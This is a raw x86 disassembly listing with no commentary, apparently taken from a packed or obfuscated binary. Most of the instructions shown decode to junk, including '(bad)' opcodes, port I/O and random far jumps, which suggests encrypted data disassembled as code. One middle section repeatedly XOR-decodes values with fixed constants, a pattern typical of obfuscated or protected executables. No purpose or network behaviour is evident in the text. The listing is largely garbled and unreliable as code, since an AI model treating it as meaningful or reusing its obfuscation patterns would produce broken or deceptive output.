  41ecf6:	sbb    al,0x68
  41ecf8:	jg     0x41eca9
  41ecfa:	repnz dec edi
  41ecfc:	daa    
  41ecfd:	fbld   TBYTE PTR [ebx+0xe04ba5]
  41ed03:	lea    edx,[esi-0x22a55ebf]
  41ed09:	dec    esp
  41ed0a:	and    BYTE PTR [ebp+0x59deccc6],ch
  41ed10:	popa   
  41ed11:	fnstenv cs:[ebx+edx*2+0x1bdc0453]
  41ed19:	imul   esi,DWORD PTR [ebx-0x27],0xffffffb6
  41ed1d:	rcr    BYTE PTR [esi-0x6f585326],0x55
  41ed24:	lods   al,BYTE PTR ds:[esi]
  41ed25:	xchg   ebx,eax
  41ed26:	and    DWORD PTR [ebx],ebp
  41ed28:	fisttp WORD PTR [edx-0x42c5eb0e]
  41ed2e:	(bad)  
  41ed30:	popa   
  41ed31:	dec    esi
  41ed32:	dec    esp
  41ed33:	dec    ebp
  41ed34:	jo     0x41ed5e
  41ed36:	push   cs
  41ed37:	ret    0x196d
  41ed3a:	out    0xee,eax
  41ed3c:	push   edx
  41ed3d:	xlat   BYTE PTR ds:[ebx]
  41ed3e:	ins    BYTE PTR es:[edi],dx
  41ed3f:	das    
  41ed40:	mov    esp,0x3b93eafe
  41ed45:	sar    BYTE PTR [ebx],0xc0
  41ed48:	loope  0x41eda3
  41ed4a:	in     eax,dx
  41ed4b:	lds    ecx,FWORD PTR [ebp-0x551edc20]
  41ed51:	mov    al,ds:0x1b329c55
  41ed56:	icebp  
  41ed57:	mov    ah,BYTE PTR [ecx]
  41ed59:	(bad)  
  41ed5c:	mov    ecx,0x2ff00e15
  41ed61:	xor    BYTE PTR [ecx],dl
  41ed63:	shl    bh,0xa2
  41ed66:	push   edi
  41ed67:	rcl    BYTE PTR [eax*8+0x5b785b41],cl
  41ed6e:	jmp    0xce01:0x2a0bea78
  41ed75:	pop    esi
  41ed76:	push   edi
  41ed77:	mov    eax,ds:0xa1fbe6b
  41ed7c:	stos   DWORD PTR es:[edi],eax
  41ed7d:	mov    DWORD PTR [ebx*8+0x2415e9f7],edi
  41ed84:	and    al,0xc
  41ed87:	adc    eax,0x583281a0
  41ed8c:	cmp    ecx,0x57ac09
  41ed92:	dec    eax
  41ed93:	adc    BYTE PTR [edi-0x6d2cbb23],ah
  41ed99:	jno    0x41edda
  41ed9b:	pop    eax
  41ed9c:	sub    eax,0x251ca398
  41eda1:	test   BYTE PTR [ecx+0x623cae99],0x75
  41eda8:	ret    0x913
  41edab:	mov    ds:0x866eb328,al
  41edb0:	scas   al,BYTE PTR es:[edi]
  41edb1:	stc    
  41edb2:	xchg   edi,eax
  41edb3:	stos   DWORD PTR es:[edi],eax
  41edb4:	sub    BYTE PTR [ebx+0x46],0xdd
  41edb8:	imul   esi,esp,0xfffffff2
  41edbb:	xchg   edx,eax
  41edbc:	jmp    0xb4a2:0xfa05d467
  41edc3:	cmp    eax,DWORD PTR [ebx+0x6f]
  41edc6:	jecxz  0x41edd4
  41edc8:	into   
  41edc9:	ret    
  41edca:	lar    esp,WORD PTR [esp+ebx*1]
  41edce:	xchg   BYTE PTR [edi-0x2e88783],cl
  41edd4:	into   
  41edd5:	dec    esp
  41edd6:	out    0xf8,eax
  41edd8:	jp     0x41ed99
  41edda:	mov    dl,0x47
  41eddc:	es and eax,0xc6469a9d
  41ede2:	mov    eax,0x1caa071e
  41ede7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ede8:	scas   al,BYTE PTR es:[edi]
  41ede9:	(bad)  
  41edea:	lds    ebx,FWORD PTR cs:[eax]
  41eded:	mov    eax,ds:0x17cfb609
  41edf2:	scas   al,BYTE PTR es:[edi]
  41edf3:	or     ebp,DWORD PTR [ecx+ebx*8+0x4a7811e3]
  41edfa:	rcl    DWORD PTR [ecx-0x31],0x5e
  41edfe:	fidivr DWORD PTR [ecx+edi*2+0x1f3b0930]
  41ee05:	loope  0x41ed94
  41ee07:	fld    QWORD PTR [ecx-0x7e96ee0c]
  41ee0d:	sub    ebx,eax
  41ee0f:	mov    ds:0x7b32558d,al
  41ee14:	out    dx,al
  41ee15:	or     eax,0xf9c2db8
  41ee1a:	in     al,dx
  41ee1b:	xor    edi,DWORD PTR cs:[edi+0x14]
  41ee1f:	and    eax,DWORD PTR [ebp+0xb7b945]
  41ee25:	push   ds
  41ee26:	xchg   edx,eax
  41ee27:	jo     0x41eded
  41ee29:	in     al,0x59
  41ee2b:	dec    ebp
  41ee2c:	cmp    BYTE PTR [ebx],dh
  41ee2e:	cwde   
  41ee2f:	imul   DWORD PTR [esi]
  41ee31:	mov    dh,BYTE PTR ds:0xbf0ac69c
  41ee37:	retf   
  41ee38:	(bad)  
  41ee39:	stos   DWORD PTR es:[edi],eax
  41ee3a:	mov    ah,0xa7
  41ee3c:	jno    0x41ee58
  41ee3e:	pop    ebx
  41ee3f:	jmp    0x4e91:0x13705889
  41ee46:	imul   esi,DWORD PTR [ebx+ebp*2+0x535ba3f],0xea9d649f
  41ee51:	daa    
  41ee52:	test   al,0x3d
  41ee54:	mov    al,ds:0x3e161c5b
  41ee59:	mov    ds:0xd33278e3,al
  41ee5e:	je     0x41ee76
  41ee60:	in     eax,0xb6
  41ee62:	in     al,0x14
  41ee64:	push   ds
  41ee65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee66:	out    0x91,al
  41ee68:	push   esi
  41ee69:	adc    edx,ebx
  41ee6b:	test   DWORD PTR [edi+0x721dee4a],eax
  41ee71:	jnp    0xc13212a5
  41ee77:	ins    DWORD PTR es:[edi],dx
  41ee78:	(bad)  
  41ee79:	fld    TBYTE PTR [ecx+0x2a]
  41ee7c:	fldcw  WORD PTR [edi-0x249e0551]
  41ee82:	inc    edx
  41ee83:	add    al,0x19
  41ee85:	js     0x41eeda
  41ee87:	add    al,0x6e
  41ee89:	les    ecx,FWORD PTR [eax+0x5a]
  41ee8c:	fld    DWORD PTR [ebx-0x6e11387e]
  41ee92:	mov    ebx,0xee7a195c
  41ee97:	js     0x41ee38
  41ee99:	imul   edi,DWORD PTR [eax-0xb07f736],0x9eddbe36
  41eea3:	sbb    ah,BYTE PTR [eax-0x6599aa47]
  41eea9:	mul    DWORD PTR [edi]
  41eeab:	fisttp DWORD PTR [edx]
  41eead:	jb     0x41ef1b
  41eeaf:	cmp    eax,0x49156c0c
  41eeb4:	in     al,dx
  41eeb5:	mov    ebx,0x9b034d59
  41eeba:	out    dx,eax
  41eebb:	jp     0x41ee4d
  41eebd:	imul   BYTE PTR [di+0x8]
  41eec1:	adc    eax,0x73a4b635
  41eec6:	nop
  41eec7:	fild   WORD PTR [edi]
  41eec9:	inc    esp
  41eeca:	or     esp,ebp
  41eecc:	pop    esp
  41eecd:	xor    DWORD PTR [eax],0x876dd190
  41eed3:	repz leave 
  41eed5:	ror    BYTE PTR [eax],0xa
  41eed8:	jnp    0x41ee99
  41eeda:	mov    al,0xd9
  41eedc:	xchg   edi,eax
  41eedd:	stos   BYTE PTR es:[edi],al
  41eede:	je     0x41ef37
  41eee0:	test   DWORD PTR ds:0x91feced,edx
  41eee6:	mov    dl,0x32
  41eee8:	bound  edx,QWORD PTR [edi+0x3eedb9e6]
  41eeee:	adc    al,0x10
  41eef0:	mov    dh,0xe1
  41eef2:	xchg   ecx,eax
  41eef3:	je     0x41eeff
  41eef5:	dec    esi
  41eef6:	add    al,0x3f
  41eef8:	push   esi
  41eef9:	ins    DWORD PTR es:[edi],dx
  41eefa:	xor    al,BYTE PTR [ecx+0x22]
  41eefd:	mov    edx,0xd082d1da
  41ef02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef03:	or     al,0x78
  41ef05:	xchg   ebp,eax
  41ef06:	adc    ecx,edx
  41ef08:	jecxz  0x41eeb3
  41ef0a:	inc    ecx
  41ef0b:	push   ecx
  41ef0c:	(bad)  
  41ef0d:	ins    BYTE PTR es:[edi],dx
  41ef0e:	add    esp,esp
  41ef10:	sub    eax,DWORD PTR [eiz*4-0x763517b1]
  41ef17:	mov    bl,0xa5
  41ef19:	loop   0x41ef83
  41ef1b:	push   ds
  41ef1c:	push   ds
  41ef1d:	das    
  41ef1e:	ss into 
  41ef20:	out    0x5f,eax
  41ef22:	data16 jg 0x41ef4f
  41ef25:	mov    ebp,0x54fae1f8
  41ef2a:	(bad)  
  41ef2b:	das    
  41ef2c:	jge    0x41ef81
  41ef2e:	jns    0x41ef64
  41ef30:	hlt    
  41ef31:	fld    DWORD PTR [ebx]
  41ef33:	sub    edx,DWORD PTR [eax-0x1d70dd33]
  41ef39:	aas    
  41ef3a:	loope  0x41ef7b
  41ef3c:	lds    eax,FWORD PTR ds:0x1c00824e
  41ef42:	test   BYTE PTR [esi],cl
  41ef44:	mov    ah,0x3c
  41ef46:	pop    eax
  41ef47:	cwde   
  41ef48:	fild   DWORD PTR [edi]
  41ef4a:	mov    esi,0x9b3db7ee
  41ef4f:	out    0x5d,al
  41ef51:	mov    al,ds:0x384cf485
  41ef56:	jnp    0x41ef4f
  41ef58:	dec    eax
  41ef59:	nop
  41ef5a:	lods   eax,DWORD PTR ds:[esi]
  41ef5b:	pusha  
  41ef5c:	sub    al,0xd7
  41ef5e:	addr16 sar esi,cl
  41ef61:	pop    esi
  41ef62:	jp     0x41ef3a
  41ef64:	mov    esi,0xf57e6b3c
  41ef69:	pop    edx
  41ef6a:	sub    DWORD PTR ds:0x9877b54e,edi
  41ef70:	and    eax,0xff72578b
  41ef75:	sti    
  41ef76:	retf   0x6844
  41ef79:	ins    DWORD PTR es:[edi],dx
  41ef7a:	aad    0xe
  41ef7c:	pop    eax
  41ef7d:	mov    ah,0xe0
  41ef7f:	sti    
  41ef80:	sti    
  41ef81:	lods   eax,DWORD PTR ds:[esi]
  41ef82:	bound  esp,QWORD PTR [esi+0x2]
  41ef85:	unpckhps xmm3,XMMWORD PTR [ebp+esi*8+0x48]
  41ef8a:	les    edx,FWORD PTR [esi-0x11c580be]
  41ef90:	pop    ebx
  41ef91:	shl    DWORD PTR [edi],cl
  41ef93:	xchg   ebx,eax
  41ef94:	mov    eax,ds:0xfbbdf3c3
  41ef99:	pop    ds
  41ef9a:	mov    esp,0xf27c71b9
  41ef9f:	dec    ebx
  41efa0:	out    0x4d,eax
  41efa2:	lahf   
  41efa3:	dec    ebp
  41efa4:	cmp    al,0x69
  41efa6:	es js  0x41ef94
  41efa9:	or     BYTE PTR [edi-0x57dd3059],cl
  41efaf:	pop    ds
  41efb0:	sbb    DWORD PTR [edi],esp
  41efb2:	and    BYTE PTR [esi-0x3d0b2dbc],dh
  41efb8:	dec    ebp
  41efb9:	adc    al,0x8c
  41efbb:	lods   eax,DWORD PTR ds:[esi]
  41efbc:	add    BYTE PTR [esi+0x1bf61749],0x2a
  41efc3:	or     bh,bh
  41efc5:	leave  
  41efc6:	push   ss
  41efc7:	inc    ecx
  41efc8:	movsx  ebx,BYTE PTR [edx+edx*2-0x2e1c2050]
  41efd0:	sub    cl,BYTE PTR [esi-0x5b]
  41efd3:	push   cs
  41efd4:	cld    
  41efd5:	cwde   
  41efd6:	dec    eax
  41efd7:	adc    esp,DWORD PTR [ecx]
  41efd9:	(bad)  
  41efda:	(bad)  
  41efdb:	push   ds
  41efdc:	out    dx,eax
  41efdd:	mov    edi,0xe5fafd09
  41efe2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41efe3:	(bad)  
  41efe4:	jmp    0xf2b47c91
  41efe9:	out    dx,eax
  41efea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41efeb:	mov    ds:0xe93187e1,ax
  41eff1:	mov    edx,DWORD PTR [ebp-0x150]
  41eff7:	xor    eax,0xcb79b576
  41effc:	xor    edx,0x9c2b8ae8
  41f002:	mov    cl,0x2
  41f004:	call   0x408bb8
  41f009:	mov    esi,eax
  41f00b:	mov    edi,edx
  41f00d:	mov    eax,DWORD PTR [ebp-0x154]
  41f013:	mov    edx,DWORD PTR [ebp-0x150]
  41f019:	xor    eax,0xcb79b576
  41f01e:	xor    edx,0x9c2b8ae8
  41f024:	mov    cl,0x3e
  41f026:	call   0x42241b
  41f02b:	or     esi,eax
  41f02d:	or     edi,edx
  41f02f:	mov    eax,DWORD PTR [ebp-0x160]
  41f035:	imul   esi,eax
  41f038:	add    esi,DWORD PTR [ebp-0x170]
  41f03e:	mov    DWORD PTR [ebp-0x16c],esi
  41f044:	mov    eax,DWORD PTR [ebp-0x16c]
  41f04a:	mov    DWORD PTR [ebp-0x178],eax
  41f050:	jmp    0x41f19e
  41f055:	jmp    0x41f105
  41f05a:	mov    eax,DWORD PTR [ebp-0x154]
  41f060:	mov    edx,DWORD PTR [ebp-0x150]
  41f066:	xor    eax,0xcb79b576
  41f06b:	xor    edx,0x9c2b8ae8
  41f071:	mov    cl,0x2
  41f073:	call   0x408bb8
  41f078:	mov    esi,eax
  41f07a:	mov    edi,edx
  41f07c:	mov    eax,DWORD PTR [ebp-0x154]
  41f082:	mov    edx,DWORD PTR [ebp-0x150]
  41f088:	xor    eax,0xcb79b576
  41f08d:	xor    edx,0x9c2b8ae8
  41f093:	mov    cl,0x3e
  41f095:	call   0x42241b
  41f09a:	or     esi,eax
  41f09c:	or     edi,edx
  41f09e:	mov    eax,DWORD PTR [ebp-0x15c]
  41f0a4:	mov    edx,DWORD PTR [ebp-0x158]
  41f0aa:	xor    eax,0xcb79b576
  41f0af:	xor    edx,0x9c2b8ae8
  41f0b5:	mov    cl,0x2
  41f0b7:	call   0x408bb8
  41f0bc:	mov    ebx,eax
  41f0be:	mov    eax,edx
  41f0c0:	mov    ecx,DWORD PTR [ebp-0x15c]
  41f0c6:	mov    edx,DWORD PTR [ebp-0x158]
  41f0cc:	xor    ecx,0xcb79b576
  41f0d2:	xor    edx,0x9c2b8ae8
  41f0d8:	mov    DWORD PTR [ebp-0x234],eax
  41f0de:	mov    eax,ecx
  41f0e0:	mov    cl,0x3e
  41f0e2:	call   0x42241b
  41f0e7:	or     ebx,eax
  41f0e9:	mov    eax,DWORD PTR [ebp-0x234]
  41f0ef:	or     eax,edx
  41f0f1:	push   eax
  41f0f2:	push   ebx
  41f0f3:	push   edi
  41f0f4:	push   esi
  41f0f5:	call   0x41594e
  41f0fa:	mov    DWORD PTR [ebp-0x178],eax
  41f100:	jmp    0x41f19e
  41f105:	mov    eax,DWORD PTR [ebp-0x15c]
  41f10b:	mov    edx,DWORD PTR [ebp-0x158]
  41f111:	xor    eax,0xcb79b576
  41f116:	xor    edx,0x9c2b8ae8
  41f11c:	mov    cl,0x2
  41f11e:	call   0x408bb8
  41f123:	mov    esi,eax
  41f125:	mov    edi,edx
  41f127:	mov    eax,DWORD PTR [ebp-0x15c]
  41f12d:	mov    edx,DWORD PTR [ebp-0x158]
  41f133:	xor    eax,0xcb79b576
  41f138:	xor    edx,0x9c2b8ae8
  41f13e:	mov    cl,0x3e
  41f140:	call   0x42241b
  41f145:	or     esi,eax
  41f147:	or     edi,edx
  41f149:	mov    DWORD PTR [ebp-0x178],esi
  41f14f:	jmp    0x41f19e
  41f154:	mov    eax,DWORD PTR [ebp-0x15c]
  41f15a:	mov    edx,DWORD PTR [ebp-0x158]
  41f160:	xor    eax,0xcb79b576
  41f165:	xor    edx,0x9c2b8ae8
  41f16b:	mov    cl,0x2
  41f16d:	call   0x408bb8
  41f172:	mov    esi,eax
  41f174:	mov    edi,edx
  41f176:	mov    eax,DWORD PTR [ebp-0x15c]
  41f17c:	mov    edx,DWORD PTR [ebp-0x158]
  41f182:	xor    eax,0xcb79b576
  41f187:	xor    edx,0x9c2b8ae8
  41f18d:	mov    cl,0x3e
  41f18f:	call   0x42241b
  41f194:	or     esi,eax
  41f196:	or     edi,edx
  41f198:	mov    DWORD PTR [ebp-0x178],esi
  41f19e:	mov    ecx,DWORD PTR [ebp-0xd8]
  41f1a4:	mov    eax,0x459a
  41f1a9:	xor    edx,edx
  41f1ab:	div    ecx
  41f1ad:	jmp    0x41f594
  41f1b2:	push   edx
  41f1b3:	inc    ebx
  41f1b4:	sbb    eax,0xbcab304b
  41f1b9:	pop    esp
  41f1ba:	or     edi,DWORD PTR [edx]
  41f1bc:	cld    
  41f1bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1be:	mov    edi,DWORD PTR [edx+edi*2-0x3f803f6e]
  41f1c5:	mov    esi,0xbebec44a
  41f1ca:	pop    ds
  41f1cb:	xor    DWORD PTR [edi+0x523ccbda],0xf3eab5cb
  41f1d5:	push   eax
  41f1d6:	dec    edi
  41f1d7:	bnd jmp 0x4965780d
  41f1dd:	lahf   
  41f1de:	fnsave [ecx-0x6709e7d3]
  41f1e4:	cld    
  41f1e5:	adc    bl,BYTE PTR [eax*8+0x43a6e92c]
  41f1ec:	jge    0x41f1b0
  41f1ee:	imul   ebx,DWORD PTR [esp+ebp*4-0x5d72960c],0x9cc3b478
  41f1f9:	sbb    al,0x83
  41f1fb:	icebp  
  41f1fc:	dec    esi
  41f1fd:	pop    esi
  41f1fe:	fwait
  41f1ff:	push   es
  41f200:	dec    edx
  41f201:	jno    0x41f1f9
  41f203:	jb     0x41f250
  41f205:	sahf   
  41f206:	sbb    DWORD PTR [ebp-0x47],0x26e88dd3
  41f20d:	pop    edi
  41f20e:	fistp  DWORD PTR [esi+0x6a]
  41f211:	arpl   ax,si
  41f213:	adc    eax,0x2b577e10
  41f218:	push   edx
  41f219:	jl     0x41f1b6
  41f21b:	pop    ebx
  41f21c:	push   esi
  41f21d:	jbe    0x41f248
  41f21f:	pop    ebp
  41f220:	test   DWORD PTR [eax+0x49],edi
  41f223:	lahf   
  41f224:	sub    eax,0x6f695619
  41f229:	xchg   esp,eax
  41f22a:	sub    DWORD PTR [ebp+0x15],eax
  41f22d:	fdivr  QWORD PTR [edx-0x50b4b93a]
  41f233:	and    BYTE PTR [edx+0x75],bh
  41f236:	and    al,cl
  41f238:	mov    bh,0x26
  41f23a:	enter  0x8066,0xa0
  41f23e:	test   BYTE PTR [bx+di],0x41
  41f242:	xchg   edx,eax
  41f243:	xchg   ecx,edi
  41f245:	js     0x41f25a
  41f247:	jb     0x41f200
  41f249:	dec    edi
  41f24a:	xchg   esi,eax
  41f24b:	add    eax,0x60f7803a
  41f250:	pop    edx
  41f251:	les    eax,FWORD PTR [eax+0x24a95fe2]
  41f257:	popa   
  41f258:	mov    dl,0xa5
  41f25a:	test   eax,0xaeed766b
  41f25f:	adc    cl,BYTE PTR ds:0x3fe7fd96
  41f265:	and    WORD PTR [esi-0x60],bp
  41f269:	xor    eax,0x4675e376
  41f26e:	into   
  41f26f:	stos   BYTE PTR es:[edi],al
  41f270:	sbb    DWORD PTR [ecx+0x39],0xa
  41f274:	jg     0x41f24f
  41f276:	(bad)  
  41f277:	ss sbb al,0x94
  41f27a:	push   edi
  41f27b:	popa   
  41f27c:	pop    esp
  41f27d:	mov    ch,0xb7
  41f27f:	addr16 xchg ecx,eax
  41f281:	pop    esi
  41f282:	push   0x8c9312d2
  41f287:	(bad)  
  41f289:	stos   DWORD PTR es:[edi],eax
  41f28a:	xchg   DWORD PTR [esi],esi
  41f28c:	in     eax,dx
  41f28d:	or     eax,0xa1fdd512
  41f292:	out    0x90,al
  41f294:	xchg   ebp,eax
  41f295:	dec    eax
  41f296:	test   DWORD PTR [edi+0x719ea80d],0x497e613b
  41f2a0:	and    ah,BYTE PTR [edx+eiz*4+0x369a5591]
  41f2a7:	test   BYTE PTR [ebx-0x52],bl
  41f2aa:	adc    dl,BYTE PTR [esi+0x4c]
  41f2ad:	or     al,0xa4
  41f2af:	lods   al,BYTE PTR ds:[esi]
  41f2b0:	jnp    0x41f2b7
  41f2b2:	dec    eax
  41f2b3:	es (bad) 
  41f2b6:	jmp    0x41f238
  41f2b8:	add    eax,0xfcadedb3
  41f2bd:	cmp    al,0x39
  41f2bf:	mov    al,ds:0xda240b3a
  41f2c4:	push   0xffffffd5
  41f2c6:	pop    edx
  41f2c7:	cli    
  41f2c8:	jecxz  0x41f298
  41f2ca:	pop    edi
  41f2cb:	data16 or BYTE PTR [ebx+0x31],dh
  41f2cf:	test   al,0x92
  41f2d1:	call   0x9008:0x7e8ceef0
  41f2d8:	push   esp
  41f2d9:	pop    ds
  41f2da:	mov    dh,0xa9
  41f2dc:	dec    ebp
  41f2dd:	mov    edx,0xb5f319fe
  41f2e2:	mov    ch,0x2e
  41f2e4:	popf   
  41f2e5:	mov    ebx,0xf49ff9e6
  41f2ea:	push   cs
  41f2eb:	out    dx,al
  41f2ec:	leave  
  41f2ed:	popf   
  41f2ee:	dec    eax
  41f2ef:	xchg   ebp,eax
  41f2f0:	mov    bl,0xa6
  41f2f2:	mov    bl,0xb4
  41f2f4:	lahf   
  41f2f5:	cmp    ebp,DWORD PTR [eax-0x13]
  41f2f8:	ja     0x41f368
  41f2fa:	xor    eax,0x42bec0d4
  41f2ff:	inc    esp
  41f300:	scas   eax,DWORD PTR es:[edi]
  41f301:	addr16 jp 0x41f2b2
  41f304:	add    al,0x99
  41f306:	cmp    eax,0x7d54b498
  41f30b:	mov    dh,0x85
  41f30d:	sub    DWORD PTR [ebp-0x6c],eax
  41f310:	loope  0x41f2ca
  41f312:	adc    al,0x38
  41f314:	nop
  41f315:	fs call 0x8134:0x39125955
  41f31d:	ret    0x6fc9
  41f320:	sbb    bl,BYTE PTR [esp+edx*1]
  41f323:	mov    cl,0x21
  41f325:	int    0xa9
  41f327:	outs   dx,BYTE PTR ds:[esi]
  41f328:	xchg   ebp,eax
  41f329:	inc    ecx
  41f32a:	fldenv [eax]
  41f32c:	cmp    edi,edi
  41f32e:	shr    DWORD PTR [ebx+0x46a942d1],1
  41f334:	adc    al,0x18
  41f336:	fwait
  41f337:	inc    ecx
  41f338:	mov    WORD PTR [ebx-0x3bcd5df8],cs
  41f33e:	or     ebp,DWORD PTR [edi-0x22]
  41f341:	sbb    esp,DWORD PTR [ebx+0xe73bf0e]
  41f347:	add    al,0xc4
  41f349:	mov    esi,0xd97f1854
  41f34e:	nop
  41f34f:	jns    0x41f30c
  41f351:	inc    edi
  41f352:	dec    ebx
  41f353:	sub    BYTE PTR [esi],bh
  41f355:	xchg   ecx,eax
  41f356:	sbb    eax,0x7a92a08b
  41f35b:	enter  0xb15c,0xd1
  41f35f:	jg     0x41f30f
  41f361:	xor    al,0xe1
  41f363:	aad    0xd8
  41f365:	ins    DWORD PTR es:[edi],dx
  41f366:	mov    ebx,0xbac7166c
  41f36b:	lahf   
  41f36c:	adc    ebp,ebx
  41f36e:	sub    dl,BYTE PTR [ecx]
  41f370:	inc    edx
  41f371:	bound  ecx,QWORD PTR [edi]
  41f373:	dec    ebx
  41f374:	xlat   BYTE PTR cs:[ebx]
  41f376:	call   0x63f39079
  41f37b:	mov    cs,WORD PTR [esi]
  41f37d:	pop    ebp
  41f37e:	jl     0x41f3ce
  41f380:	xor    BYTE PTR ds:0xae94ca9a,0xd2
  41f387:	sbb    ah,BYTE PTR [ebp-0x5defd78e]
  41f38d:	icebp  
  41f38e:	repz and ah,BYTE PTR [ebx+0x4e]
  41f392:	sub    al,0x71
  41f394:	push   ebx
  41f395:	cmp    BYTE PTR [edi+edx*8-0x420feab6],dh
  41f39c:	push   eax
  41f39d:	pop    ecx
  41f39e:	enter  0x937,0xac
  41f3a2:	or     DWORD PTR ds:0xd1cf4ca0,ecx
  41f3a8:	dec    BYTE PTR [esi]
  41f3aa:	stos   DWORD PTR es:[edi],eax
  41f3ab:	ficom  WORD PTR cs:[edi-0x7e23b802]
  41f3b2:	add    bh,BYTE PTR [edi-0x31]
  41f3b5:	mov    ebp,0x909a0b73
  41f3ba:	shl    DWORD PTR [esi+0x4682a8ea],1
  41f3c0:	cli    
  41f3c1:	rol    DWORD PTR [eax+0x71],cl
  41f3c4:	mov    DWORD PTR [ebp-0x10],esi
  41f3c7:	xchg   ebx,eax
  41f3c8:	cmp    BYTE PTR [eax-0x4e],0xa2
  41f3cc:	pop    bx
  41f3ce:	cmp    BYTE PTR [ebp+0x42f2f16],0x94
  41f3d5:	cli    
  41f3d6:	repz repnz push es
  41f3d9:	inc    ecx
  41f3da:	xlat   BYTE PTR ds:[ebx]
  41f3db:	and    dh,BYTE PTR [ebp+0x4f91a2a1]
  41f3e1:	sahf   
  41f3e2:	mov    esp,0xee42e7b
  41f3e7:	popf   
  41f3e8:	cmp    DWORD PTR [edx],ebx
  41f3ea:	mov    esp,0x8209db3b
  41f3ef:	cs (bad) 
  41f3f1:	(bad)  
  41f3f2:	aaa    
  41f3f3:	rcr    bh,0x1c
  41f3f6:	push   eax
  41f3f7:	inc    esi
  41f3f8:	cmp    eax,0xeeec2d8
  41f3fd:	(bad)  
  41f3fe:	xchg   edx,eax
  41f3ff:	test   DWORD PTR [ebp+0x25c8e2bc],ebx
  41f405:	jno    0x41f41c
  41f407:	add    DWORD PTR [edx+eiz*4-0x9],eax
  41f40b:	sbb    eax,0x74a2662b
  41f410:	jnp    0x41f435
  41f412:	add    eax,0x82119fac
  41f417:	mov    ecx,0xad1382d1
  41f41c:	scas   al,BYTE PTR es:[edi]
  41f41d:	jecxz  0x41f460
  41f41f:	ret    0x2f59
  41f422:	sbb    DWORD PTR ds:0xfa1d2827,ebx
  41f428:	mov    edx,0x4751b8fe
  41f42d:	fs fmulp st(6),st
  41f430:	out    0xe2,al
  41f432:	(bad)  
  41f433:	sub    dl,BYTE PTR [esi+0x12e406a4]
  41f439:	pop    ds
  41f43a:	jo     0x41f3c3
  41f43c:	leave  
  41f43d:	fwait
  41f43e:	push   ds
  41f43f:	mov    ah,0x11
  41f441:	fcmovne st,st(0)
  41f443:	and    bl,al
  41f445:	or     DWORD PTR [ecx],ecx
  41f447:	and    ebp,DWORD PTR [esp+eiz*4+0x36bd521c]
  41f44e:	pushf  
  41f44f:	inc    edi
  41f450:	sub    BYTE PTR [ecx-0x3a429417],cl
  41f456:	push   ss
  41f457:	and    esp,DWORD PTR [ebp+0x78ad2b57]
  41f45d:	lds    edx,FWORD PTR [esi]
  41f45f:	addr16 cmp al,0xc9
  41f462:	idiv   BYTE PTR [esp+edx*1-0x60]
  41f466:	jmp    0xfb87:0xf60cc727
  41f46d:	xchg   ebx,eax
  41f46e:	sbb    eax,0xf569c2d8
  41f473:	pop    edx
  41f474:	fmulp  st(7),st
  41f476:	(bad)  
  41f477:	or     eax,0xa83e7af5
  41f47c:	cdq    
  41f47d:	dec    edx
  41f47e:	and    BYTE PTR [edx],ah
  41f480:	xchg   esi,eax
  41f481:	dec    esp
  41f482:	jb     0x41f494
  41f484:	jmp    0x9a6b:0x93dc93c7
  41f48b:	fcomp  st(0)
  41f48d:	out    dx,eax
  41f48e:	xor    DWORD PTR [eax+0x1a],ebp
  41f491:	and    BYTE PTR [edi-0x49],0xdf
  41f495:	xchg   DWORD PTR [edx+0x74c522e6],edi
  41f49b:	mov    esp,0x9af444ce
  41f4a0:	xchg   DWORD PTR [edx-0x14df1c05],ebp
  41f4a6:	js     0x41f491
  41f4a8:	(bad)  
  41f4a9:	arpl   ax,di
  41f4ab:	fisttp WORD PTR [ebx-0x7e9cab38]
  41f4b1:	push   0x35a025cd
  41f4b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4b7:	inc    ebp
  41f4b8:	mov    bh,0xbb
  41f4ba:	add    DWORD PTR [ebp-0x2001a5b0],esp
  41f4c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f4c1:	outs   dx,BYTE PTR ds:[esi]
  41f4c2:	adc    eax,DWORD PTR [ebx-0x67]
  41f4c5:	mov    bl,0x6d
  41f4c7:	shl    DWORD PTR [edi+0x7da04b5e],cl
  41f4cd:	dec    eax
  41f4ce:	cmp    DWORD PTR [edx-0x6e],0x55f41105
  41f4d5:	(bad)  
  41f4d6:	stc    
  41f4d7:	push   0xffffffd4
  41f4d9:	or     BYTE PTR [edx+0x9],dl
  41f4dc:	sbb    eax,0xf0f1267c
  41f4e1:	neg    BYTE PTR [ebx+0x24abf62]
  41f4e7:	mov    bl,0x24
  41f4e9:	adc    eax,0xaa4bedde
  41f4ee:	xlat   BYTE PTR ds:[ebx]
  41f4ef:	mov    bh,0xd0
  41f4f1:	push   ebp
  41f4f2:	retf   0x2252
  41f4f5:	dec    esi
  41f4f6:	rcr    DWORD PTR [edi-0x37777464],cl
  41f4fc:	jecxz  0x41f50f
  41f4fe:	xchg   ebx,eax
  41f4ff:	pop    ds
  41f500:	aaa    
  41f501:	fdiv   QWORD PTR [eax-0x7fa85eb3]
  41f507:	ror    BYTE PTR [edi+0x70e7a014],0xa5
  41f50e:	xchg   edi,eax
  41f50f:	dec    ebx
  41f510:	push   0x5c
  41f512:	push   0x77
  41f514:	es leave 
  41f516:	fistp  QWORD PTR [edi+esi*2]
  41f519:	dec    edi
  41f51a:	push   0xe5ac0696
  41f51f:	cli    
  41f520:	jg     0x41f56f
  41f522:	mov    ch,0xc0
  41f524:	jmp    0x3f8e9b0
  41f529:	jae    0x41f4ec
  41f52b:	js     0x41f4bd
  41f52d:	jae    0x41f4fd
  41f52f:	sbb    al,0xfa
  41f531:	mov    ah,BYTE PTR [edi-0x1e]
  41f534:	fcmovbe st,st(3)
  41f536:	hlt    
  41f537:	fwait
  41f538:	lods   al,BYTE PTR ds:[esi]
  41f539:	ins    DWORD PTR es:[edi],dx
  41f53a:	pop    eax
  41f53b:	inc    ebx
  41f53c:	mov    esi,ds
  41f53e:	mov    DWORD PTR [edi],edx
  41f540:	cmp    ebx,DWORD PTR [ebx]
  41f542:	aas    
  41f543:	pushf  
  41f544:	xor    eax,0x27603d3b
  41f549:	mov    ds:0xcf493350,eax
  41f54e:	mov    ah,0x73
  41f550:	fld    TBYTE PTR [ebx]
